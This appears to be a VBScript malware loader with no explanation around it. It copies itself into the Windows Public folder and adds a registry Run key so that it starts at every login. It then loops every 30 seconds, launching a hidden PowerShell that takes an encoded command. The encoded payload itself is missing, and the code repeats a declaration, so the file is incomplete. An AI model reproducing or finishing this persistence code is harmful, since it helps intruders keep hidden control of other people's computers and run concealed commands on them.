Dim FSO
Dim scriptName : scriptName = WScript.ScriptName
Set FSO = CreateObject("Scripting.FileSystemObject")
FSO.CopyFile scriptName, "C:\Users\Public\"
Set FSO = nothing
paths = "C:\users\public\"
Set WshShell = CreateObject("WScript.Shell")
myKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\run\autostartup"
WshShell.RegWrite myKey,(paths+scriptName),"REG_SZ"

do 
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
ReturnCode = WshShell.run ("cmd.exe /c Powershell -nop -noni -window hidden -enc ",0, True)
wscript.sleep 30000 
loop 
